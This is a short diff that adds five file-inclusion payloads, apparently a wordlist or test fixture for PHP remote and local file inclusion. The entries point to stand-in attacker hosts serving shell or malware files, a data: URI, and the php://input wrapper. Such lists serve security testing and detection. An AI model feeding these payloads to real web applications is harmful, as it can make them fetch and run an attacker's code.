@@ -1,0 +1,5 @@
+http://attacker.com/evil.php
+http://192.168.1.5/malware.txt
+https://raw.githubusercontent.com/.../shell.txt
+data:text/plain,malicious
+php://input
